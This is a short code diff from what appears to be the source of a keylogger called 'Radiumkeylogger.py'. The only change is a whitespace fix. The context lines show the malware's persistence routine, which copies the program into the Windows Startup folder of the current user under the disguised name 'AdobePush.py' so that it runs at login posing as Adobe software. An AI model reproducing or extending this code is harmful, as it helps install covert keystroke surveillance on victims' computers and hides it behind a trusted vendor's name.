@@ -199,9 +199,9 @@ def copytostartup():
         #-----------------------
         originalfilename = "Radiumkeylogger.py"  #This name should be equal to the name of exe/py that you create. Currently the name of this file is Radiumkeylogger.py
         #-----------------------
-		#-----------------------
+        #-----------------------
         coppiedfilename = 'AdobePush.py'    #The file will be copied to startup folder by this name
-		#-----------------------
+        #-----------------------
         copytodir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
         copyfromdir = currentdir + "\\" + originalfilename
 
